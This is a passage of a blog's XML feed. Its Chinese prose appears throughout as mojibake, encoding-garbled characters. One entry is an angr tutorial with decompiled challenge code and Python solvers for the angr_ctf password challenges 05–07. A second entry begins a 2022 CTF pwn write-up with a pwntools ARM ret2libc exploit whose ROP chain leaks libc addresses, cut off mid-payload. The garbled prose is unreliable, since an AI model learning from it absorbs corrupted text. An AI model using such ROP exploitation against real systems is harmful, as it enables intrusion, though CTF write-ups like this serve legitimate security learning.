ï¼Œæˆ‘ä»¬å‘ç°æ˜¯å¾€å†…å­˜bssæ®µé‡Œè¯»å…¥4ä¸ª8bytesï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬åˆ©ç”¨ä¸€ä¸ªä¸ºå†…å­˜èµ‹å€¼çš„è¯­å¥</p><p>init_state.memory.store(address,passwd0)   è¿™ä¸ªæ˜¯æŠŠpasswd0èµ‹å€¼ç»™addressè¿™ä¸ªåœ°å€çš„é‡Œ</p><p>ç„¶åæˆ‘ä»¬åˆ›å»º4ä¸ªå˜é‡å¹¶ä¸”æŠŠè¿™ä¸ªå››ä¸ªå˜é‡æ”¾åˆ°è¯»å…¥çš„å†…å­˜é‡Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">address=<span class="number">0xA1BA1C0</span></span><br><span class="line">init_state.memory.store(address,passwd0)  <span class="comment">#æ”¾åˆ°</span></span><br><span class="line">init_state.memory.store(address+<span class="number">0x8</span>,passwd1)</span><br><span class="line">init_state.memory.store(address+<span class="number">0x10</span>,passwd2)</span><br><span class="line">init_state.memory.store(address+<span class="number">0x18</span>,passwd3)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ³¨æ„å­—èŠ‚çš„å¢é•¿</p><p>ç„¶åä¸‹é¢å°±æ˜¯æŒ‰ç…§ä¹‹å‰çš„æ–¹æ³•è·å–ç›¸åº”çš„çŠ¶æ€å€¼å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solver</span>():</span><br><span class="line">    binary=<span class="string">&quot;./05_angr_symbolic_memory&quot;</span></span><br><span class="line">    proj=angr.Project(binary)</span><br><span class="line">    start_address=<span class="number">0x8048601</span></span><br><span class="line">    init_state=proj.factory.blank_state(addr=start_address)</span><br><span class="line">    </span><br><span class="line">    passwd0=claripy.BVS(<span class="string">&quot;passwd0&quot;</span>,<span class="number">64</span>)</span><br><span class="line">    passwd1=claripy.BVS(<span class="string">&quot;passwd1&quot;</span>,<span class="number">64</span>)</span><br><span class="line">    passwd2=claripy.BVS(<span class="string">&quot;passwd2&quot;</span>,<span class="number">64</span>)</span><br><span class="line">    passwd3=claripy.BVS(<span class="string">&quot;passwd3&quot;</span>,<span class="number">64</span>)</span><br><span class="line">    address=<span class="number">0xA1BA1C0</span></span><br><span class="line">    init_state.memory.store(address,passwd0)</span><br><span class="line">    init_state.memory.store(address+<span class="number">0x8</span>,passwd1)</span><br><span class="line">    init_state.memory.store(address+<span class="number">0x10</span>,passwd2)</span><br><span class="line">    init_state.memory.store(address+<span class="number">0x18</span>,passwd3)</span><br><span class="line"></span><br><span class="line">    simgr=proj.factory.simgr(init_state)</span><br><span class="line">    simgr.explore(find=<span class="number">0x804866A</span>,avoid=<span class="number">0x8048658</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> simgr.found:</span><br><span class="line">        solution_state=simgr.found[<span class="number">0</span>]</span><br><span class="line">        solution0=solution_state.solver.<span class="built_in">eval</span>(passwd0,cast_to=<span class="built_in">bytes</span>)</span><br><span class="line">        solution1=solution_state.solver.<span class="built_in">eval</span>(passwd1,cast_to=<span class="built_in">bytes</span>)</span><br><span class="line">        solution2=solution_state.solver.<span class="built_in">eval</span>(passwd2,cast_to=<span class="built_in">bytes</span>)</span><br><span class="line">        solution3=solution_state.solver.<span class="built_in">eval</span>(passwd3,cast_to=<span class="built_in">bytes</span>)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;passwd0:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(solution0))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;passwd1:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(solution1))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;passwd2:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(solution2))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;passwd3:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(solution3))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&quot;couln not !!!!!!!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    solver()</span><br></pre></td></tr></table></figure><h2 id="ä¸ƒã€06-åŠ¨æ€memory"><a href="#ä¸ƒã€06-åŠ¨æ€memory" class="headerlink" title="ä¸ƒã€06 åŠ¨æ€memory"></a>ä¸ƒã€06 åŠ¨æ€memory</h2><p>è¿™é‡Œæ˜¯åŠ¨æ€çš„chunkï¼Œmallocå‡ºæ¥çš„ï¼Œè¿™é‡Œæˆ‘ä»¬åœ¨åŠ¨æ€é‡Œè¿›è¡Œä¼ªé€ fakechunkï¼Œç„¶åå†å¾€è¿™ä¸ªä¼ªé€ çš„chunkè¿›è¡Œæ”¾å…¥å‘é‡å³å¯</p><p>å…ˆçœ‹ä¸‹æºä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [esp-10h] [ebp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+0h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  buffer0 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">9u</span>);</span><br><span class="line">  buffer1 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">9u</span>);</span><br><span class="line">  <span class="built_in">memset</span>(buffer0, <span class="number">0</span>, <span class="number">9u</span>);</span><br><span class="line">  <span class="built_in">memset</span>(buffer1, <span class="number">0</span>, <span class="number">9u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the password: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%8s %8s&quot;</span>, buffer0, buffer1, v6);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = &amp;buffer0[i];</span><br><span class="line">    *v3 = complex_function(buffer0[i], i);</span><br><span class="line">    v4 = &amp;buffer1[i];</span><br><span class="line">    *v4 = complex_function(buffer1[i], i + <span class="number">32</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(buffer0, <span class="string">&quot;UODXLZBI&quot;</span>, <span class="number">8u</span>) &amp;&amp; !<span class="built_in">strncmp</span>(buffer1, <span class="string">&quot;UAORRAYF&quot;</span>, <span class="number">8u</span>) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Good Job.&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again.&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(buffer0);</span><br><span class="line">  <span class="built_in">free</span>(buffer1);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è·å–buffer0å’Œbuffer1çš„åœ°å€å¯¹è¿™ä¸ªåœ°å€è¿›è¡Œfakeå³å¯</p><p>ä»¥ä¸‹æ˜¯æˆ‘ä¼ªé€ çš„ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">buf0=<span class="number">0xABCC8A4</span></span><br><span class="line">buf1=<span class="number">0xABCC8AC</span></span><br><span class="line">fake_buf0=<span class="number">0xAAAAA10</span></span><br><span class="line">fake_buf1=<span class="number">0xAAAAA20</span></span><br><span class="line">p1=claripy.BVS(<span class="string">&quot;p1&quot;</span>,<span class="number">64</span>)</span><br><span class="line">p2=claripy.BVS(<span class="string">&quot;p2&quot;</span>,<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">init_state.memory.store(buf0,fake_buf0,endness=proj.arch.memory_endness)</span><br><span class="line">init_state.memory.store(buf1,fake_buf1,endness=proj.arch.memory_endness)</span><br><span class="line"></span><br><span class="line">init_state.memory.store(fake_buf0,p1)</span><br><span class="line">init_state.memory.store(fake_buf1,p2)</span><br></pre></td></tr></table></figure><p>ç„¶åä¸‹ä¸€æ­¥ä¸€æŠŠæ¢­è·å–çŠ¶æ€å€¼å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_path</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(sys.stdout.fileno())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">avoid_path</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(sys.stdout.fileno())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solver</span>():</span><br><span class="line">    binary=<span class="string">&quot;./06_angr_symbolic_dynamic_memory&quot;</span></span><br><span class="line"></span><br><span class="line">    proj=angr.Project(binary)</span><br><span class="line"></span><br><span class="line">    start_address=<span class="number">0x8048699</span></span><br><span class="line"></span><br><span class="line">    init_state=proj.factory.blank_state(addr=start_address)</span><br><span class="line"></span><br><span class="line">    buf0=<span class="number">0xABCC8A4</span></span><br><span class="line">    buf1=<span class="number">0xABCC8AC</span></span><br><span class="line">    fake_buf0=<span class="number">0xAAAAA10</span></span><br><span class="line">    fake_buf1=<span class="number">0xAAAAA20</span></span><br><span class="line">    p1=claripy.BVS(<span class="string">&quot;p1&quot;</span>,<span class="number">64</span>)</span><br><span class="line">    p2=claripy.BVS(<span class="string">&quot;p2&quot;</span>,<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">    init_state.memory.store(buf0,fake_buf0,endness=proj.arch.memory_endness)</span><br><span class="line">    init_state.memory.store(buf1,fake_buf1,endness=proj.arch.memory_endness)</span><br><span class="line"></span><br><span class="line">    init_state.memory.store(fake_buf0,p1)</span><br><span class="line">    init_state.memory.store(fake_buf1,p2)</span><br><span class="line"></span><br><span class="line">    simgr=proj.factory.simgr(init_state)</span><br><span class="line">    simgr.explore(find=find_path,avoid=avoid_path)</span><br><span class="line">    <span class="keyword">if</span> simgr.found:</span><br><span class="line">        sol_state=simgr.found[<span class="number">0</span>]</span><br><span class="line">        p1=sol_state.solver.<span class="built_in">eval</span>(p1,cast_to=<span class="built_in">bytes</span>)</span><br><span class="line">        p2=sol_state.solver.<span class="built_in">eval</span>(p2,cast_to=<span class="built_in">bytes</span>)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;p1:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(p1))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;p2:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(p2))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&quot;Colud not!!!!!!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    solver()</span><br></pre></td></tr></table></figure><p>å…«ã€07  ç¬¦å·fiileæ–‡ä»¶</p><p>è¿™ä¸ªé¢˜æ˜¯å¯¹fileæ–‡ä»¶è¿›è¡Œç¬¦å·åŒ–</p><p>æˆ‘ä»¬çœ‹ä¸‹é¢˜ç›®ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(buffer, <span class="number">0</span>, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the password: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%64s&quot;</span>, buffer);</span><br><span class="line">  ignore_me((<span class="type">int</span>)buffer, <span class="number">0x40</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(buffer, <span class="number">0</span>, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">  fp = fopen(<span class="string">&quot;OJKSQYDP.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">  fread(buffer, <span class="number">1u</span>, <span class="number">0x40</span>u, fp);</span><br><span class="line">  fclose(fp);</span><br><span class="line">  unlink(<span class="string">&quot;OJKSQYDP.txt&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )</span><br><span class="line">    *(_BYTE *)(i + <span class="number">0x804A0A0</span>) = complex_function(*(<span class="type">char</span> *)(i + <span class="number">0x804A0A0</span>), i);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(buffer, <span class="string">&quot;AQWLCTXB&quot;</span>, <span class="number">9u</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Good Job.&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬çœ‹åˆ°ï¼Œè¿™é“æ‰“å¼€äº†ä¸€ä¸ªæ–‡ä»¶ã€‚åœ¨è¿™é“é¢˜çš„åŸºç¡€ä¸Šï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨angræ¨¡æ‹Ÿæ–‡ä»¶ä»è€Œè¿›è¡Œæ–‡ä»¶å†…å®¹ç¬¦å·åŒ–ï¼Œæˆ‘ä»¬ç”¨åˆ°äº†å‡ ä¸ªå…³é”®è¯­å¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">file_size=<span class="number">0x40</span></span><br><span class="line">filename=<span class="string">&#x27;OJKSQYDP.txt&#x27;</span></span><br><span class="line">password=claripy.BVS(<span class="string">&#x27;password&#x27;</span>,file_size*<span class="number">8</span>)</span><br><span class="line">file_name=angr.storage.SimFile(filename,content=password,size=file_size)</span><br><span class="line">init_state.fs.insert(filename,file_name)</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬åˆ©ç”¨angr.storage.SimFileæ¨¡æ‹Ÿæ–‡ä»¶ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæ–‡ä»¶åï¼Œç¬¬äºŒä¸ªä¸ºæˆ‘ä»¬çš„å‘é‡ï¼Œç¬¬ä¸‰ä¸ªä¸ºé¢˜ç›®æœ¬èº«çš„è¯»å…¥çš„sizeï¼Œç„¶åæ¨¡æ‹Ÿå®Œåï¼Œæˆ‘ä»¬å†å¯¹æ–‡ä»¶ç³»ç»Ÿè¿›è¡Œè½½å…¥init_state.fs.insert(filename,file_name)å³å¯å®ç°æ–‡ä»¶ç¬¦å·åŒ–</p><p>ç„¶åå‰©ä¸‹å°±æ˜¯ç”¨angrè¿›è¡Œæ¨¡æ‹Ÿï¼Œè·å–çŠ¶æ€ï¼Œè·å–å‘é‡çŠ¶æ€å€¼ï¼Œä¸€æŠŠæ¢­</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isGood</span>(<span class="params">state</span>):</span><br><span class="line"><span class="keyword">return</span> <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isBad</span>(<span class="params">state</span>):</span><br><span class="line"><span class="keyword">return</span> <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solver</span>():</span><br><span class="line">    binary=<span class="string">&quot;./07_angr_symbolic_file&quot;</span></span><br><span class="line">    proj=angr.Project(binary)</span><br><span class="line">    </span><br><span class="line">    start_address=<span class="number">0x80488EA</span></span><br><span class="line">    init_state=proj.factory.blank_state(addr=start_address)</span><br><span class="line"></span><br><span class="line">    file_size=<span class="number">0x40</span></span><br><span class="line">    filename=<span class="string">&#x27;OJKSQYDP.txt&#x27;</span></span><br><span class="line">    password=claripy.BVS(<span class="string">&#x27;password&#x27;</span>,file_size*<span class="number">8</span>)</span><br><span class="line">    file_name=angr.storage.SimFile(filename,content=password,size=file_size)</span><br><span class="line">    init_state.fs.insert(filename,file_name)</span><br><span class="line">    </span><br><span class="line">    simgr=proj.factory.simgr(init_state)</span><br><span class="line">    simgr.explore(find=isGood,avoid=isBad)</span><br><span class="line">    <span class="keyword">if</span> simgr.found:</span><br><span class="line">        sol_state=simgr.found[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        passwd=sol_state.solver.<span class="built_in">eval</span>(password,cast_to=<span class="built_in">bytes</span>)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;passwd:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(passwd))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&quot;Colund not!!!!!!&quot;</span>) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    solver()   </span><br></pre></td></tr></table></figure><p>æœªå®ŒæŒç»­</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CTF-Angr-ç¬¦å·æ‰§è¡Œå­¦ä¹ ï¼ˆä¸€ï¼‰&quot;&gt;&lt;a href=&quot;#CTF-Angr-ç¬¦å·æ‰§è¡Œå­¦ä¹ ï¼ˆä¸€ï¼‰&quot; class=&quot;headerlink&quot; title=&quot;CTF Angr ç¬¦å·æ‰§è¡Œå­¦ä¹ ï¼ˆä¸€ï¼‰&quot;&gt;&lt;/a&gt;CTF Angr ç¬¦å·æ‰§è¡Œå­¦ä¹ ï¼ˆä¸€ï¼‰&lt;/h1&gt;&lt;h2 id=&quot;å‰</summary>
      
    
    
    
    <category term="pwn" scheme="https://jsjsj.top/categories/pwn/"/>
    
    
    <category term="angr" scheme="https://jsjsj.top/tags/angr/"/>
    
  </entry>
  
  <entry>
    <title>2022å®‰æ´µæ¯ CTF PWN wp</title>
    <link href="https://jsjsj.top/2022/10/03/2022%E5%AE%89%E6%B4%B5%E6%9D%AF%20CTF%20PWN%20wp/"/>
    <id>https://jsjsj.top/2022/10/03/2022%E5%AE%89%E6%B4%B5%E6%9D%AF%20CTF%20PWN%20wp/</id>
    <published>2022-10-03T14:15:34.000Z</published>
    <updated>2023-10-03T14:29:52.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2022å®‰æ´µæ¯-CTF-PWN-wp"><a href="#2022å®‰æ´µæ¯-CTF-PWN-wp" class="headerlink" title="2022å®‰æ´µæ¯ CTF PWN wp"></a>2022å®‰æ´µæ¯ CTF PWN wp</h1><p>##å‰è¨€ï¼šä¸Šåˆåœ¨æ‰“åˆ«çš„æ¯”èµ›ï¼Œé¢˜ä¸éš¾ï¼Œä¸‹åˆä¸‰ç‚¹æ‰ä¸Šçš„å·ï¼Œå¯¼è‡´æˆ‘ä»¬å·®ä¸€åè¿›å†³èµ›ï¼Œå¤ªå¯æƒœäº†ï¼ˆéƒ½æ€ªæˆ‘  å‘œå‘œå‘œï¼Œä¸‹æ¬¡è®¤çœŸã€‚</p><p>##babyarmï¼š<br>æ€è·¯ï¼šæ ˆæº¢å‡ºï¼Œå¼‚æ„PWNï¼Œarmï¼Œretlibc2ï¼Œä¸€æ¬¡retlibcæ³„éœ²gotè¡¨è®¡ç®—å‡ºlibcåŸºåœ°å€ï¼Œç¬¬äºŒæ¬¡æ‰“systemå³å¯ï¼Œæ‰¾åˆ°gadgetä¼ å‚å³å¯ï¼Œç”±äºé¢˜ç›®æ˜¯arm32ä½ï¼Œå‰4ä¸ªå‚æ•°æ˜¯ç”¨r0~r3å¯„å­˜å™¨ä¼ å‚ï¼Œæ‰€ä»¥æˆ‘ä»¬ç¬¬ä¸€æ­¥æ³„éœ²libcçš„è¯ï¼Œéœ€è¦æ‰¾åˆ°pop r0ï¼Œç„¶åå†æ‰¾ä¸€ä¸ªæœ‰blxçš„å¯„å­˜å™¨è¿›è¡Œè·³è½¬å³å¯ï¼Œå‚è€ƒkotå¸ˆå‚…çš„å¯„å­˜å™¨ï¼Œé‡‡ç”¨äº†ä»¥ä¸‹<br>pop{r4,r5,r6,r7,r8,sb,sl,pc}   pop{r3,pc}  mov r0,r7;blx r3<br>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process([<span class="string">&#x27;qemu-arm&#x27;</span>,<span class="string">&#x27;-g&#x27;</span>,<span class="string">&#x27;1234&#x27;</span>,<span class="string">&#x27;-L&#x27;</span>,<span class="string">&#x27;/usr/arm-linux-gnueabi&#x27;</span>,<span class="string">&#x27;./chall&#x27;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./chall&quot;</span>)</span><br><span class="line"></span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt=<span class="number">0x0104AC</span></span><br><span class="line">mainaddr=<span class="number">0x10C4C</span></span><br><span class="line"><span class="comment">#ropper --files libc.2.27.so search &quot;pop|mov&quot;</span></span><br><span class="line"><span class="comment">#pop &#123;r4, r5, r6, r7, r8, sb, sl, pc&#125;</span></span><br><span class="line"><span class="comment"># pop &#123;r3, pc&#125;</span></span><br><span class="line"><span class="comment">#mov r0, r7; blx r3</span></span><br><span class="line">popr1=<span class="number">0x00010cb0</span>   </span><br><span class="line">popr3=<span class="number">0x00010464</span></span><br><span class="line">movr0=<span class="number">0x00010ca0</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;msg&gt;&quot;</span>,<span class="string">&quot;s1mpl3Dec0d4r&quot;</span>)</span><br><span class="line"><span class="comment">#leak libc_bse</span></span><br><span class="line">rop1=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x2c</span>+p32(popr1)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(puts_got)+p32(<span 